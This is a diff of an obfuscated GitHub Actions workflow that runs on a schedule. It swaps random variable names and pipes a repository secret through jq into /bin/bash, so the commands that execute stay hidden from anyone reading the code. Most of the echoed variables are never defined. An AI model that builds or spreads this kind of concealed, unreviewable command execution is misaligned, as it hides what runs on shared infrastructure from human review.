@@ -3,8 +3,7 @@ name: pengzhongzhou2013
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 3/6 * * *'
-
+    - cron: '55 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: pengzhongzhou2013
         env:
-          zq62773: ${{ secrets.zq62773 }}
+          tzpt7908: ${{ secrets.tzpt7908 }}
         run: |
-          echo $zq62773 | jq -r .a764 | /bin/bash
-          echo $axu8 | jq -r .rcg4 | /bin/bash
-          echo $sh55697 | jq -r .b7060 | /bin/bash
-          echo $pr4 | jq -r .kydwb043 | /bin/bash
-          echo $xnhle974 | jq -r .u50332 | /bin/bash
-          echo $rt4 | jq -r .wqklv3585 | /bin/bash
-          echo $gkvd244 | jq -r .if3 | /bin/bash
-          echo $jvv67 | jq -r .aqsa75981 | /bin/bash
-          echo $d1118 | jq -r .rmf594 | /bin/bash
-          echo $dh96674 | jq -r .d9674 | /bin/bash
+          echo $tzpt7908 | jq -r .loe75728 | /bin/bash
+          echo $wbd63 | jq -r .pakjn94852 | /bin/bash
+          echo $ueq601 | jq -r .vxen6390 | /bin/bash
+          echo $bvnu827 | jq -r .cwo612 | /bin/bash
+          echo $hcsa1 | jq -r .uassb49 | /bin/bash
+          echo $fcqmn21248 | jq -r .blmc30 | /bin/bash
+          echo $bz12 | jq -r .wgbxt49881 | /bin/bash
+          echo $xo68 | jq -r .rukim8 | /bin/bash
 
